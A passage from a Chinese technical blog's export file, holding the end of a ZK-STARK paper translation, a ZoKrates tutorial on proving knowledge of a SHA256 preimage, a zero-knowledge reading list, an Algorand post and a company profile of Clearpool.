<p>  <em>“该值a是在具有承诺cmt的数据库中，对具有承诺cmp的档案文件进行匹配搜索的结果”</em></p>
<p>  答案是三种可能性之一：“不匹配”，“部分匹配”或“完全匹配”。公开(开源)计算C是将由可信任的第三方执行的用于验证上述声明的计算。此计算需要三个公共输入(cmt, cmp和A)，以及两个机密输入：DNA文档数据库D’和个人DNA文档文件p’。当且仅当公共输入(cmt, cmp, A)和机密输入(D’, p’)满足以下三个条件时，计算C则成功终止：</p>
<p> (i)针对机密输入D’的承诺cm’与公开输入cmt相等；</p>
<p> (ii)针对机密输入p’的承诺cmp’与公开输入cmp相等；</p>
<p> (iii)在机密数据集D’中对机密输入p’进行匹配搜索后，得到输出则会公开宣布结果a.</p>
<p>  令|D(n)|为数据集D(n)的比特长度，n为DNA档案的条目数量(每条档案为40字节长度)。令CC(n)为ZK-STARK的通信复杂度，数据集仍然为D(n)，例如，在证明人与验证人之间，总的通信比特值。令Tc(n)为原始验证计算C在D上执行时，数据量为n时，所耗费的时间。令Tv(n)为V验证所耗费的时间。以上时间是同为一台物理服务器上测试所得。</p>
<h3 id="2-讨论-—-权力下放的社会职能的应用"><a href="#2-讨论-—-权力下放的社会职能的应用" class="headerlink" title="2 讨论 — 权力下放的社会职能的应用"></a>2 讨论 — 权力下放的社会职能的应用</h3><p>  以比特币为首的加密货币通过建议完全分布式的货币体系来代替法定货币，加密货币同时正在破坏已建立的金融系统。 金钱只是可以分布式的社会功能之一，法律合同已经被以太坊区块链中的自动智能合同取代。 在本节结束时，我们将讨论ZK-STARK系统对分散式公共分类账的两个预期影响。</p>
<h5 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a>可扩展性</h5><p>  现如今，在区块链中进行了激烈的讨论，围绕着适当的方式来扩展交易吞吐量，而又不会增加参与网络的节点的时间和空间。正如其中一位作者首次指出的那样，并且最近被数种加密货币计划所采用，完全可扩展的证明系统(即使没有零知识)也可以通过成倍地减少验证时间来解决可扩展性问题。更详细地讲，单个“证明人节点”可以在准线性时间内生成一个证明，该证明将说服其他节点接受账本当前状态是有效的，而无需那些节点原始地重新数据库查询计算，也不需要存储整个区块链的状态。</p>
<h5 id="隐私性"><a href="#隐私性" class="headerlink" title="隐私性"></a>隐私性</h5><p>  ZK证明的保密性已被用于增强加密货币的互换能力和隐私能力。最近在Zcash加密货币中实现并使用一种特殊的零知识证明，即ZK-SNARK，它基于密码学指数知识(knowledge of exponent, KOE)的假设，以完整地维护其条目的分布式注册表，该注册表隐藏着未动用资金的承诺。</p>
<p>  ZK-SNARK(zero-knowledge succint non-interactive arguments of knowledge。Zero knowledge：零知识证明；Succinctness：证据信息较短，方便验证；Non-interactivity：无交互，证明者基本上只要提供一个字符串义工验证。对于区块链来说，这一点至关重要，意味着可以把该消息放在链上公开验证；Arguments：证明过程是计算完好（computationally soundness）的，证明者无法在合理的时间内造出伪证（破解）。跟计算完好对应的是理论完好（perfect soundness)，密码学里面一般都是要求计算完好；knowledge：对于一个证明者来说，在不知晓特定证明 (witness) 的前提下，构建一个有效的零知识证据是不可能的。</p>
<p>  ZK-SNARK是不是透明的，因为它们需要一个“设置阶段setup phase”，该阶段使用了非公开的随机性，如果受到损害，则可以用来损害系统的安全性。展望未来，ZK-STARK可以替代ZK-SNARK，透明地实现Zcash的可替代性和机密性。<strong>当前，ZK-SNARK比ZK-STARK证明size小约1000倍，因此用ZK-STARK替换ZKSNARK还需要进行更多的研究以缩短证明长度，或者使用可增量验证的计算来汇总和压缩多个ZK-STARK证明。</strong>例如，ZK-SNARK的证明size为几百bytes，ZK-STARK的证明size为几百Kbytes。</p>
<h3 id="3-与其他的ZK系统相比较"><a href="#3-与其他的ZK系统相比较" class="headerlink" title="3 与其他的ZK系统相比较"></a>3 与其他的ZK系统相比较</h3><p>hPKC — Homomorphic public-key cryptography 同态公钥密码，如Pinocchio和libSNARK。</p>
<p>DLP — Discrete logarithm problem 离散对数问题，如BulletProofs。</p>
<p>IP — Interactive Proofs 交互式证明。如Hyrax。</p>
<p>MPC — Secure multi-party computation 多方安全计算。如ZKBoo、Ligero。</p>
<p>IVC — Incrementally Verifiable Computation 增量可验证计算。如hPKC-based IVC。</p>
<p><img src="/2020/06/11/ZK-STARK%E8%AE%BA%E6%96%87-%E7%BF%BB%E8%AF%91/1.png"></p>
<h5 id="具体测试指标"><a href="#具体测试指标" class="headerlink" title="具体测试指标"></a>具体测试指标</h5><p>  测试均基于同一个硬件服务器，基于同样的DPM问题。</p>
<p>  Arithmetic circuit complexity as standard measuring yard — 算术电路复杂度作为标准测量场。此处测试的所有系统(包括ZK-STARK)均为算术化之后的运算，将计算完整性(CI)语句简化为相关的有限域上的低次多项式系统。我们强调ZK-STARK也可以在素数场上运行，但代码中尚未实现。</p>
<p>  在DPM计算中，数据库中具有n条数据，算术电路的参数如下：</p>
<ul>
<li><p>电路深度 depthn = 62·n</p>
</li>
<li><p>电路宽度 w = 81</p>
</li>
<li><p>验证复杂度 witn = 40·n bytes</p>
</li>
<li><p>乘法复杂度 multn = 1467·62·n ≈ (2^16.4)·n</p>
<p>我们对ZK-STARK系统(证明方+验证方)进行了测量，本ZK-STARK具有60位(bits)的安全性，即n最大值≈60。libSNARK、SCI具有80位的安全性。BCCGP具有128位。Ligero具有60位的安全性。我们预估80位证明者的证明时间比60位最多长5％。<a href="https://ethereum.stackexchange.com/questions/59145/zk-snarks-vs-zk-starks-vs-bulletproofs-updated">如果您看到下图，则它们还包括一个没有setup的libSNARK线，并且明显位于ZK-STARK线之下。</a></p>
</li>
</ul>
<p><img src="/2020/06/11/ZK-STARK%E8%AE%BA%E6%96%87-%E7%BF%BB%E8%AF%91/2.png"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>  在上述以对照的方式进行测试，ZK-STARK是测量的所有电路尺寸中生成证明最快的，特别是与libSNARK相比较，速度快了近10倍。在小电路情况下，ZKBoo和Ligero的通信时间更短，验证更快。在深度较小的电路的情况下，Hyrax的通信时间更短，验证更快。在同一固定电路上多次重复的计算，BulletProofs, Pinocchio, libSNARK的通信时间更短，验证更快。但是，对于一般的大规模计算，ZK-STARK的验证时间和通信复杂性优于其他透明系统。换句话说，我们对ZK-STARK的实践表明，对于实际相关的具体计算(例如DPM)，已经充分体现了完全可伸缩性和透明性的优势，并表明我们的系统类型对于构建可伸缩性解决方案很有用， 例如，用于分布式的加密货币。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
        <tag>paper</tag>
      </tags>
  </entry>
  <entry>
    <title>ZKP应用实例之哈希与其原像知识</title>
    <url>/2023/02/28/ZKP%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B%E4%B9%8B%E5%93%88%E5%B8%8C%E4%B8%8E%E5%85%B6%E5%8E%9F%E5%83%8F%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>本实例，将实现一个在区块链用例中非常典型的操作：证明给定哈希摘要的原像知识。 特别是，假设<strong>证明者</strong>（<strong>Peggy</strong>）向<strong>验证者</strong>（<strong>Victor</strong>）毫无疑问地证明她知道摘要的哈希原像 ，但没有透露原像是什么。</p>
<ol start="0">
<li>本实例以zokrates为ZKP工具（iden3亦可）。</li>
</ol>
<h3 id="1-计算hash"><a href="#1-计算hash" class="headerlink" title="1. 计算hash"></a>1. 计算hash</h3><p>我们将通过使用 ZoKrates 计算任意选择的原像的哈希值来开始本教程，在本例中，原像内容为数字 <strong>5</strong>。</p>
<p>首先，我们创建一个名为 hashexample.zok 的新文件，内容如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">import <span class="string">&quot;hashes/sha256/512bitPacked&quot;</span> <span class="keyword">as</span> sha256packed;</span><br><span class="line"></span><br><span class="line">def main(private field a, private field b, private field c, private field d) -&gt; field[<span class="number">2</span>] &#123;</span><br><span class="line">    field[<span class="number">2</span>] h = sha256packed([a, b, c, d]);</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一行从 ZoKrates 标准库导入 sha256packed 函数。</p>
<p>sha256packed 是一个 SHA256 的实现。它是这样工作的：我们想将 <strong>512 位的输入</strong>传递给 SHA256。 但是，由于其背后使用的基础字段的原因，Zokrates中字段值只能容纳 254 位，无法容纳256位的输入。因此，我们使用四个字段元素，每个元素编码 128 位，来表示我们的输入。然后这四个元素在 ZoKrates 中连接起来并传递给 SHA256。 鉴于生成的散列长度为 256 位，我们将其一分为二并将每个值作为 128 位数字返回。</p>
<p>如上，代码实际上只是使用 sha256packed，返回计算出的哈希值。</p>
<h4 id="1-1-首先，我们使用编译命令将程序编译成一个运算电路。"><a href="#1-1-首先，我们使用编译命令将程序编译成一个运算电路。" class="headerlink" title="1.1 首先，我们使用编译命令将程序编译成一个运算电路。"></a>1.1 首先，我们使用编译命令将程序编译成一个运算电路。</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zokrates compile -i hashexample.zok</span><br></pre></td></tr></table></figure>

<h4 id="1-2-第二步，我们可以使用以下命令创建见证文件"><a href="#1-2-第二步，我们可以使用以下命令创建见证文件" class="headerlink" title="1.2 第二步，我们可以使用以下命令创建见证文件"></a>1.2 第二步，我们可以使用以下命令创建见证文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zokrates compute-witness -a 0 0 0 5</span><br></pre></td></tr></table></figure>

<p>使用标志 -a 我们将参数传递给程序。 回想一下，我们的目标是计算数字 <strong>5</strong> 的哈希值。因此我们将 a、b 和 c 设置为 <strong>0</strong>，将 d 设置为 <strong>5</strong>。</p>
<p>此时，我们可以检查 witness 文件中的返回值：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep &#x27;~out&#x27; witness</span><br><span class="line">~out_0 263561599766550617289250058199814760685</span><br><span class="line">~out_1 65303172752238645975888084098459749904</span><br></pre></td></tr></table></figure>

<p>因此，通过将输出连接为 128 位数字，我们得到以下值作为我们选择的原像的哈希值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// 计算<span class="number">5</span>的sha256</span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"></span><br><span class="line">preimage = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span>(<span class="built_in">int</span>(preimage.<span class="built_in">hex</span>(), <span class="number">16</span>)) //binary representation of pre-image </span><br><span class="line">//output <span class="keyword">is</span> <span class="string">&#x27;0b101&#x27;</span></span><br><span class="line"></span><br><span class="line">hashlib.sha256(preimage).hexdigest() //compute <span class="built_in">hash</span></span><br><span class="line">//output <span class="keyword">is</span></span><br><span class="line">//<span class="string">&#x27;c6481e22c5ff4164af680b8cfaa5e8ed3120eeff89c4f307c4a6faaae059ce10&#x27;</span></span><br></pre></td></tr></table></figure>

<p>此处，愿像的hash值‘c6481e22c5ff4164af680b8cfaa5e8ed3120eeff89c4f307c4a6faaae059ce10’ 与 witness中out_0 out_1拼接后的hash内容是一致的。</p>
<h3 id="2-证明原像知识"><a href="#2-证明原像知识" class="headerlink" title="2. 证明原像知识"></a>2. 证明原像知识</h3><p>现在，我们已经看到我们可以使用 ZoKrates 计算哈希值。</p>
<p>让我们回顾一下我们的目标：<strong>Peggy</strong> 想证明她知道 <strong>Victor</strong> 选择的摘要的原像，但不透露原像是什么。 现在让我们假设 <strong>Victor</strong> 选择摘要作为我们在上面的示例中找到的摘要。</p>
<p>为了让它发挥作用，双方必须遵循他们在协议中的角色：</p>
<h4 id="2-1-Victor-必须指定他感兴趣的哈希"><a href="#2-1-Victor-必须指定他感兴趣的哈希" class="headerlink" title="2.1 Victor 必须指定他感兴趣的哈希"></a>2.1 <strong>Victor</strong> 必须指定他感兴趣的哈希</h4><p>因此，我们必须调整由 ZoKrates 编译的 zkSNARK 电路，这样除了计算摘要外，它还根据 <strong>Victor</strong> 提供的感兴趣的摘要对其进行验证。 这导致 hashexample.zok 的以下更新：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">import <span class="string">&quot;hashes/sha256/512bitPacked&quot;</span> <span class="keyword">as</span> sha256packed;</span><br><span class="line"></span><br><span class="line">def main(private field a, private field b, private field c, private field d) &#123;</span><br><span class="line">    field[<span class="number">2</span>] h = sha256packed([a, b, c, d]);</span><br><span class="line">    assert(h[<span class="number">0</span>] == <span class="number">263561599766550617289250058199814760685</span>);</span><br><span class="line">    assert(h[<span class="number">1</span>] == <span class="number">65303172752238645975888084098459749904</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请注意，现在将 sha256packed 的结果与 <strong>Victor</strong> 定义的硬编码正确解决方案进行比较。 我们添加的行被视为断言：验证者不会接受不满足这些约束的证明。 显然，如果所有计算的位都相等，则此程序仅返回 1。</p>
<h4 id="2-2-Victor-现在可以编译代码"><a href="#2-2-Victor-现在可以编译代码" class="headerlink" title="2.2 Victor 现在可以编译代码"></a>2.2 Victor 现在可以编译代码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zokrates compile -i hashexample.zok</span><br><span class="line"></span><br><span class="line">zokrates setup</span><br><span class="line"></span><br><span class="line">zokrates export-verifier</span><br></pre></td></tr></table></figure>

<p><strong>setup</strong>创建一个 verification.key 文件和一个 proving.key 文件。 <strong>Victor</strong>把证明钥匙给了<strong>Peggy</strong>。</p>
<h4 id="2-3-Peggy-提供正确的原像作为程序的参数"><a href="#2-3-Peggy-提供正确的原像作为程序的参数" class="headerlink" title="2.3 Peggy 提供正确的原像作为程序的参数"></a>2.3 Peggy 提供正确的原像作为程序的参数</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zokrates compute-witness -a 0 0 0 5</span><br></pre></td></tr></table></figure>

<h4 id="2-4-Peggy-可以运行命令来构建证明"><a href="#2-4-Peggy-可以运行命令来构建证明" class="headerlink" title="2.4 Peggy 可以运行命令来构建证明"></a>2.4 Peggy 可以运行命令来构建证明</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zokrates generate-proof</span><br></pre></td></tr></table></figure>

<p>由于输入在程序中被声明为私有，因此由于协议的零知识属性，它们不会出现在证明中。</p>
<p>ZoKrates 创建一个文件 proof.json，由构成 zkSNARKs 证明的三个椭圆曲线点组成。 <strong>Victor</strong> 部署的智能合约中的 verifyTx 函数接受这三个值以及一系列公共输入。公共输入数组包括：</p>
<ul>
<li>main 函数的任何公共输入，声明时没有使用 private 关键字</li>
<li>ZoKrates 函数的返回值</li>
</ul>
<p>在本示例中，所有输入都是私有的，并且只有一个返回值 1。</p>
<h4 id="2-5-然后-Peggy-可以通过调用-verifyTx-提交她的证明"><a href="#2-5-然后-Peggy-可以通过调用-verifyTx-提交她的证明" class="headerlink" title="2.5 然后 Peggy 可以通过调用 verifyTx 提交她的证明"></a>2.5 然后 Peggy 可以通过调用 verifyTx 提交她的证明</h4><h4 id="2-6-Victor-监控验证智能合约以获取-Peggy-交易的返回值"><a href="#2-6-Victor-监控验证智能合约以获取-Peggy-交易的返回值" class="headerlink" title="2.6 Victor 监控验证智能合约以获取 Peggy 交易的返回值"></a>2.6 Victor 监控验证智能合约以获取 Peggy 交易的返回值</h4><p>一旦<strong>Victor</strong>观察到来自 <strong>Peggy</strong> 的公共地址的具有真实返回值的交易，Victor就可以确定Peggy拥有他在智能合约中设置的哈希值的有效原像。</p>
<h3 id="3-延伸"><a href="#3-延伸" class="headerlink" title="3.延伸"></a>3.延伸</h3><p>在此示例中只涉及两方。这种特殊情况使得处理 zkSNARKs 的信任假设变得容易：只有 Victor 对验证 Peggy 的声明感兴趣，因此他可以信任他对设置阶段的执行。</p>
<p>一般来说，多方可能有兴趣验证Peggy声明的正确性。例如，在基于零知识的加密货币 Zcash 中，每个节点都需要能够验证交易的正确性。为了将设置阶段推广到这些多方用例，需要执行一个通常称为“可信设置”或“仪式”的过程。</p>
<p>即可以实现 - <a href="https://willzhuang.github.io/2020/06/23/%E4%BD%93%E9%AA%8Czksync-2/">https://willzhuang.github.io/2020/06/23/%E4%BD%93%E9%AA%8Czksync-2/</a></p>
<h3 id="4-结论"><a href="#4-结论" class="headerlink" title="4.结论"></a>4.结论</h3><p>这可能算做一个知识证明，但是题目中的应用实例，是什么呢？</p>
<p>参考链接 - circom - <a href="https://willzhuang.github.io/2021/05/06/circom%E8%AF%95%E7%94%A8/">https://willzhuang.github.io/2021/05/06/circom%E8%AF%95%E7%94%A8/</a></p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>algorand 算法图解</title>
    <url>/2018/05/04/algorand-%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/</url>
    <content><![CDATA[<p><img src="/2018/05/04/algorand-%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/1.jpg"></p>
<p>相关博文：<br><a href="https://willzhuang.github.io/2018/04/09/Algorand%E7%AE%97%E6%B3%95%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/">Algorand算法特性总结</a><br><a href="https://willzhuang.github.io/2018/03/31/%E5%8F%AF%E9%AA%8C%E8%AF%81%E9%9A%8F%E6%9C%BA%E5%87%BD%E6%95%B0VRF%E4%B9%8BAlgorand%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/">可验证随机函数VRF之Algorand共识算法</a></p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>awesome links of zero knowledge proof</title>
    <url>/2018/03/20/awesome-links-of-zero-knowledge-proof/</url>
    <content><![CDATA[<p><a href="https://z.cash/zh/technology/zksnarks.html">zk-SNARKs 原文链接</a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/zcash/zips/blob/master/protocol/protocol.pdf">Zcash协议规范</a></p>
<h4 id="解释SNARKs系列文章"><a href="#解释SNARKs系列文章" class="headerlink" title="解释SNARKs系列文章"></a>解释SNARKs系列文章</h4><p><a href="https://z.cash/blog/snark-explain.html">1. 同态隐藏</a></p>
<p><a href="https://z.cash/blog/snark-explain2.html">2. 多项式盲评估</a></p>
<p><a href="https://z.cash/blog/snark-explain3.html">3. 系数测试知识和假设</a></p>
<p><a href="https://z.cash/blog/snark-explain4.html">4. 如何验证多项式盲评估</a></p>
<p><a href="https://z.cash/blog/snark-explain5.html">5. 从计算到多项式</a></p>
<p><a href="https://z.cash/blog/snark-explain6.html">6. Pinocchio Protocol — 皮诺曹协议</a></p>
<p><a href="https://z.cash/blog/snark-explain7.html">7. 配对椭圆曲线</a></p>
<p><a href="https://github.com/WillZhuang/zero-knowledge-proofs">8. 零知识证明在 Quorum 中是如何使用的 — Zero Knowledge Proofs and how they can be implemented in Quorum</a></p>
<p><a href="https://github.com/WillZhuang/zkrangeproof">9. 零知识证明在以太坊智能合约端如何实现区间证明 — zero knowledge range-proof precompiled contract for the go-ethereum client</a></p>
<h4 id="论文"><a href="#论文" class="headerlink" title="论文"></a>论文</h4><p><a href="https://eprint.iacr.org/2013/279.pdf">1. 皮诺曹协议</a></p>
<p><a href="https://github.com/zcash/mpc/blob/master/whitepaper.pdf">2. Paramgen白皮书</a></p>
<p><a href="http://zerocash-project.org/media/pdf/zerocash-extended-20140518.pdf">3. Zerocash论文</a></p>
<h4 id="技术博客文章"><a href="#技术博客文章" class="headerlink" title="技术博客文章"></a>技术博客文章</h4><p><a href="https://blog.cryptographyengineering.com/2014/11/27/zero-knowledge-proofs-illustrated-primer/">1. Matt Green: 零知识证明</a></p>
<p><a href="https://z.cash/zh/blog/anatomy-of-zcash.html">2. Zcash交易解剖</a></p>
<p><a href="https://z.cash/zh/blog/zcash-private-transactions.html">3. 隐私交易如何完成的</a></p>
<p><a href="https://z.cash/zh/blog/generating-zcash-parameters.html">4. Zcash的参数是如何生成的</a></p>
<p><a href="https://z.cash/zh/blog/pairing-cryptography-in-rust.html">5. 在Rust进行密码学配对</a></p>
<h4 id="相关项目"><a href="#相关项目" class="headerlink" title="相关项目"></a>相关项目</h4><p><a href="http://oblivm.com/hawk/">1. HAWK：私有的智能合约</a></p>
<p><a href="https://z.cash/blog/bolt-private-payment-channels.html">2. BOLT：私有的支付通道</a></p>
<p>后面的博客中会针对上述内容进行分析。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>clearpool公司调研</title>
    <url>/2021/03/10/clearpool%E5%85%AC%E5%8F%B8%E8%B0%83%E7%A0%94/</url>
    <content><![CDATA[<p>2020-04-06，电子交易解决方案提供商、独立代理经纪交易商<a href="https://clearpoolgroup.com/">Clearpool</a> Group周一宣布，该公司现已被<a href="https://www.bmo.com/">BMO</a>金融集团收购。根据该公司的声明，收购交易的完成将加速其电子交易解决方案的开发，其并未透露收购金额方面的条款。收购后，Clearpool将作为BMO Financial Group旗下的一个独立品牌。</p>
<p><a href="https://clearpoolgroup.com/">https://clearpoolgroup.com/</a></p>
<h3 id="透明，信任和控制"><a href="#透明，信任和控制" class="headerlink" title="透明，信任和控制"></a>透明，信任和控制</h3><p>在算法交易中，Clearpool的算法管理系统（AMS）正在使用完全可自定义的算法交易工具套件对电子交易进行转型，从而提供从策略到执行的全面可见性和控制力。</p>
<p>一个独立的取证工具，用于检查整个股票市场的历史场馆表现。</p>
<ul>
<li>每月或每季度查看一次场地绩效。</li>
<li>获取可行的数据以分析场地的性能并在算法的路由表中优化场地的优先级。</li>
<li>根据订单的意图确定最合适的场地，而不是将每个场地的表现都视为绝对。 例如，某些场所可能更适合激进订单，而其他场所则更适合中点流动性。</li>
<li>根据MiFID II和拟议的SEC增强的订单透明度规则，有充分的条件证明您最好的防爆协议。一个独立的取证工具，用于检查整个股票市场的历史场馆表现。</li>
</ul>
<p>对通过Clearpool的AMS发送的流程执行对等分析。</p>
<ul>
<li><p>同时订阅Venue Analysis的Clearpool AMS用户还可以在一个屏幕上查看我们自己的流量范围，此外还可以查看自己的流量。</p>
</li>
<li><p>查看Clearpool的整个匿名执行数据范围，其中包括我们由100多个经纪商组成的网络，这些经纪人为世界上许多最大的资产管理公司提供服务。</p>
</li>
<li><p>与我们具有统计意义的数据集比较并对比您自己数据中的趋势。</p>
</li>
<li><p>使用此数据可帮助您在如何优化访问场所方面做出公正的决定。</p>
</li>
</ul>
<p>强大的交互式可视化功能使您可以轻松地钻取数据。</p>
<ul>
<li>我们的工具可以为您可视化数据，使您可以轻松发现趋势和离群值，并花费更少的时间清理数据和分析电子表格。</li>
<li>使用多个过滤器，只需单击几下即可对数据进行切片和切块，包括策略，场所类型，市值等。</li>
<li>通过单击交互式条形图，饼形图或热图，甚至可以进一步展开操作，以显示用于所选数据的新仪表板。</li>
</ul>
<h3 id="以你的方式交易"><a href="#以你的方式交易" class="headerlink" title="以你的方式交易"></a>以你的方式交易</h3><p>Clearpool的基于云的AMS为您的算法交易策略提供了自定义，执行，分析和优化的功能。 通过完全透明和最终的路由控制，您拥有有效地大规模协作和管理自己的算法交易技术的工具和见解。</p>
<p>AMS-Algorithmic Management System：算法管理系统<br>一个完整的基于云的算法交易平台，提供交易前合规性和风险检查，算法策略和路由协议的自定义可配置性以及高级分析，以在整个电子交易生命周期中提高透明度和控制力。</p>
<p>场地分析<br>Clearpool的场所分析为市场参与者提供了独立的解决方案，可以评估整个股票市场的场所。这是一种取证工具，可以每月或每季度检查一次场地绩效，为您提供可行的数据来分析和优化绩效。用它来帮助验证您的路由协议以证明最佳性能。</p>
<p>掌握您的电子交易性能和成本。</p>
<ul>
<li><p>设计定制的路由协议，确定场所的优先级以实现最佳执行，最大程度地减少信息泄漏和滑移，并在各个策略和阶段中添加或删除场所。</p>
</li>
<li><p>设置被动和激进的紧急程度，通过基于策略目标管理调度程序逻辑，拍卖参与，调整大小，数量跟踪和其他高级协议来实现高级算法行为。</p>
</li>
<li><p>通过基于Web的AMS客户门户无缝管理算法交易。</p>
</li>
</ul>
<p>从策略配置到订单执行的内置透明度。</p>
<ul>
<li><p>可视化策略和场地绩效，并通过填充率，返工和贸易成本评估绩效。</p>
</li>
<li><p>基准性能，评估场所并确定其优先级，并通过优化策略配置使分析结果可付诸实践。</p>
</li>
<li><p>受益于我们的汇总订单智能逻辑，该逻辑通过汇总类似的订单来最大化场地队列优先级，以维持最佳的队列位置并实现更好的质量执行。</p>
</li>
</ul>
<p>拥有数十年电子贸易领域专业知识的技术合作伙伴，值得信赖。</p>
<ul>
<li><p>将您的算法交易基础架构外包，以支持您的电子交易产品。</p>
</li>
<li><p>获得您的客户经理，我们的定量团队和服务台的全力支持，以协助进行与贸易有关的查询。</p>
</li>
<li><p>作为一个完整的SaaS解决方案，无需进行持续的硬件维护，并且所有软件更新都将部署在AMS的安全分区中的云中。</p>
</li>
</ul>
<p>受益于基于云的基础架构的规模和效率。</p>
<ul>
<li><p>提供无需资本投资的差异化电子交易产品。</p>
</li>
<li><p>将技术留给专家，并最大程度地减少进行日常维护所需的内部资源。</p>
</li>
<li><p>受益于我们的整体规模，基础架构和执行服务。</p>
</li>
</ul>
<h3 id="Clearpool执行服务"><a href="#Clearpool执行服务" class="headerlink" title="Clearpool执行服务"></a>Clearpool执行服务</h3><p>Clearpool的独立代理经纪人交易商可提供无冲突的流动性访问。CES不会针对客户流进行交易或进行任何专有交易。我们的路由协议是完全透明的。结合我们AMS的强大功能，我们可以有效地为合作伙伴提供流动性并确保最佳执行质量。</p>
<ul>
<li><p>仅代理商的订单执行和经纪人中立的流动性访问。</p>
</li>
<li><p>Clearpool原则上不进行交易。</p>
</li>
<li><p>我们不拥有或投资黑池或ATS。</p>
</li>
<li><p>我们不会违反您的订单流程。</p>
</li>
<li><p>我们利用经纪交易商来促进AMS订单的有效执行。</p>
</li>
<li><p>所有订单都是匿名发送的。</p>
</li>
</ul>
<p>场地关系由Clearpool Execution Services建立和维护。</p>
<ul>
<li><p>美国所有交易所的成员。</p>
</li>
<li><p>可进入40多个黑暗场所，包括ATS，有条件场所，做市商和单一交易商。</p>
</li>
<li><p>多个结算关系。</p>
</li>
<li><p>全面的供应商管理。 会员，交叉连接和实施费用由CES承担。</p>
</li>
</ul>
<p>全面的贸易支持和服务。</p>
<ul>
<li><p>我们深厚的电子交易和场馆知识将为您提供专业的服务支持。</p>
</li>
<li><p>我们的定量团队和开发人员团队对每个场所的订单要求都有明确的了解，以促进无缝的订单执行。</p>
</li>
<li><p>边缘控件有助于在场所级别管理风险。</p>
</li>
<li><p>我们的支持团队可以对不合格的订单流，已取消和拒绝的订单以及会话/场地断开进行实时故障排除。</p>
</li>
</ul>
<h3 id="被收购前，公司主页地址-https-www-clearpool-io"><a href="#被收购前，公司主页地址-https-www-clearpool-io" class="headerlink" title="被收购前，公司主页地址: https://www.clearpool.io/"></a>被收购前，公司主页地址: <a href="https://www.clearpool.io/">https://www.clearpool.io/</a></h3><h4 id="准备就绪的，代币化的交易所"><a href="#准备就绪的，代币化的交易所" class="headerlink" title="准备就绪的，代币化的交易所"></a>准备就绪的，代币化的交易所</h4><p>Clearpool是一家由华尔街和纽约市聚集的资深创新者组成的公司，正在建立世界上第一个真正的代币化多边贸易基金，在FCA的授权下，它引入了完全数字化的机构级交易所，没有场馆驱动的托管风险，并进入了欧洲市场。</p>
<p>由具有数十年经验的全球交易所专家集中设计和建造，以达到最高的技术和法规标准。Clearpool将为加密资产交易带来可靠性和性能的新标准，并为全新的金融服务交付方法定下基调。</p>
<p>运营受监管的市场并确保合规很难，参与者别无选择，只能相信监管者的做法是正确的。 但是我们可以做得更好。Clearpool开发了一种独特的方法来跟踪场内状态，该方法允许创建和发布实时可验证的市场数据，参与者可以使用这些数据来验证预期的场地行为。</p>
<p>不仅如此。 我们将底层的加密安全监视事件流与可派生的仲裁事件流一起使用。 通过将这些流锚定到抗审查性的区块链，我们获得了可完美扩展，不可辩驳的审计跟踪，从而使监管机构可以验证所有场所行为-完全透明，而不会泄漏信息。 更好的是，它还可以用于非加密资产，例如传统股票黑池。</p>
<h4 id="我们的愿景"><a href="#我们的愿景" class="headerlink" title="我们的愿景"></a>我们的愿景</h4><p>我们的目标一直是为所有参与者提供公平的市场，并为监管者的愿望提供智能和创新的支持。为此，我们看到了两个关键领域：改进市场微观结构，以使衡量市场公平性和质量更加客观；其次，改善市场交付本身的基础结构，以便更轻松地取消对互操作活动的监管，并提供更好的一流服务。支持验证公平，安全的市场运作。</p>
<p>Clearpool的愿景是将这两项改进结合到一个受监管的场所中，以证明对市场微观结构的切实改进，同时重要地是对公平，优质市场的交付，可验证和可计量的数量进行验证。我们可以通过将我们在市场微观结构方面拥有的现有知识和IP与我们开发的新技术相结合来实现这两个目标，这些新技术采用了分布式分类帐和区块链空间的一些创新，并将其应用于解决我们希望解决的特定问题讲话。</p>
<p>Clearpool MTF将成为世界上第一个完全标记化的<a href="https://baike.baidu.com/item/MTF%E4%BA%A4%E6%98%93%E5%B9%B3%E5%8F%B0/16701370">MTF</a>，其中数字化在交易基础设施中不可或缺。这将允许参与者实时地以及由管理者追溯地验证场地上的所有交易和活动。实际上，该场所为监管机构提供了无可辩驳的参考，并为减轻参与者的监管负担，同时增加了所有人的洞察力和价值铺平了道路。</p>
